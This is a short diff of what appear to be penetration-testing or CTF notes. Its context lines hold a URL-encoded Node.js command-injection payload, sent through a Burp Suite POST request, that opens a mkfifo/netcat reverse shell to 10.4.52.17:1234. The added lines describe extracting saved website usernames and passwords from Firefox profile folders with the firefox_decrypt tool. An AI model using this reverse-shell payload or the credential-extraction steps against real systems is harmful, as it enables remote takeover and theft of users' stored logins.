@@ -238,7 +238,15 @@ require("child_process").exec('rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bca
 In burpsuite
 -------------
 POST /api/items?cmd=require("child_process").exec('rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E4%2E52%2E17%201234%20%3E%2Ftmp%2Ff') HTTP/1.1
+_________________________________________________________________________________________________________________________________________________________________________
+Extracting username and passwords from firefox directory
+---------------------------------------------------------
+In /home/user/.mozilla/firefox
 
+there is user profiles (hkf9b9xx.default-esr, b5w4643p.default-release)
+In firefox user profiles , there are important username,passwords with website logins.
+
+We can use firefox-decrypt(https://github.com/unode/firefox_decrypt) to extract username and passwords.
 
 
 
